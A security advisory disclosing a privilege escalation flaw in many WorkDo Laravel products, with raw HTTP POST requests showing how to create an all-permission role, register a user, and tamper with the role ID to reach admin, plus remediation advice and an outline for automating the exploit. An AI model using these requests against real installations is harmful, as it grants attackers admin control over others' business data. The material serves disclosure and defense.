# 🔓 WorkDo Products - Privilege Escalation via Role Manipulation

📌 **Product Information**  
**Platform**: Laravel  
**Affected Feature**: Role & User Creation  
**Tested Vulnerability**: Privilege Escalation via `role` ID Tampering  
**CVE**: Not Assigned  
**Severity**: Critical (Unauthenticated to Admin via Account Setup)  
**CWE ID**: CWE-269  
**CWE Name**: Improper Privilege Management  
**Patched**: ❌ Not Applicable  
**Patch Priority**: 🔴 High  
**Date Published**: June 13, 2025  
**Researcher**: yucaerin  
**Vendor**: [WorkDo](https://codecanyon.net/user/workdo)

**Vulnerable Products**:
- [TicketGo - Support Ticket System](https://codecanyon.net/item/ticketgo-support-ticket-system/23051838)
- [Taskly - Project Management Tool](https://codecanyon.net/item/taskly-project-management-tool/24264721)
- [Taskly SaaS - Project Management Tool](https://codecanyon.net/item/taskly-saas-project-management-tool/24490506)
- [AccountGo - Accounting and Billing Tool](https://codecanyon.net/item/accountgo-accounting-and-billing-tool/25725131)
- [AccountGo SaaS - Accounting and Billing Tool](https://codecanyon.net/item/accountgo-saas-accounting-and-billing-tool/25733019)
- [HRMGo - HRM and Payroll Tool](https://codecanyon.net/item/hrmgo-hrm-and-payroll-tool/25982864)
- [HRMGo SaaS - HRM and Payroll Tool](https://codecanyon.net/item/hrmgo-saas-hrm-and-payroll-tool/25982934)
- [StoreGo - SaaS Online Store Builder](https://codecanyon.net/item/storego-saas-online-store-builder/31116337)
- [WhatsStore - SaaS Online WhatsApp Store Builder](https://codecanyon.net/item/whatsstore-saas-online-whatsapp-store-builder/32111583)
- [ERPGo SaaS - All-in-One Business ERP](https://codecanyon.net/item/erpgo-saas-all-in-one-business-erp-with-project-account-hrm-crm-pos/33263426)
- [ERPGo - All-in-One Business ERP](https://codecanyon.net/item/erpgo-all-in-one-business-erp-with-project-account-hrm-crm-pos/33263435)
- [vCardGo SaaS - Digital Business Card Builder](https://codecanyon.net/item/vcardgo-saas-digital-business-card-builder/34885397)
- [EcommerceGo SaaS - Ecommerce Store](https://codecanyon.net/item/ecommercego-saas-ecommerce-store-with-multi-theme-and-multi-store/45984492)
- [AdvocateGo SaaS - Legal Practice Management](https://codecanyon.net/item/advocatego-saas-legal-practice-management/46105956)
- [BookingGo SaaS - Multi Business Appointment Booking](https://codecanyon.net/item/bookinggo-saas-multi-business-appointment-booking-and-scheduling/50585829)

---

⚠️ **Summary of the Vulnerability**  
In many WorkDo products, user role creation and assignment lack proper access controls. A user can escalate privileges by:

1. Creating a role with full admin permissions via:
```
POST /roles
```

2. Creating a user account with the crafted role (e.g., `role=4`) via:
```
POST /users
```

3. Manually modifying the `role` ID from a basic role (e.g., 4) to `role=1` (typically admin).

## 🧪 Proof of Concept (PoC)  

### ➤ Step 1 - Create Role with Admin Permissions
```http
POST /roles
Content-Type: application/x-www-form-urlencoded

_token=[CSRF_TOKEN]&name=testadminrole&permissions[]=1&permissions[]=2&...&permissions[]=48
```

### ➤ Step 2 - Register a New User with the Custom Role
```http
POST /users
Content-Type: application/x-www-form-urlencoded

_token=[CSRF_TOKEN]&name=testuser&email=test@example.com&password=123123123&role=4&is_login=on
```

### ➤ Step 3 - Modify Role Assignment
Change `role=4` to `role=1` manually or via direct POST request to escalate privileges.

✅ **Indicators of Success**:
- Redirect to admin dashboard
- Admin-only menus become accessible
- Access to system settings and user management

## 🔍 Where’s the Flaw?
- No server-side verification of who is allowed to create roles or assign them.
- Client input on `role` field is trusted blindly.
- Missing RBAC enforcement on critical endpoints.

## 🔐 Recommendation
- Restrict role creation and modification to verified admin users.
- Validate user permissions server-side before allowing `role` assignment.
- Implement audit logs for role-related actions.

## ⚙️ Optional Automation Features
An automated exploit could:
- Register user
- Retrieve CSRF token
- Modify role via crafted POST
- Confirm privilege escalation

## ⚠️ Disclaimer  
This PoC is for **educational and authorized security testing** only.  
Do **not** target systems without explicit permission. Unauthorized exploitation is illegal.
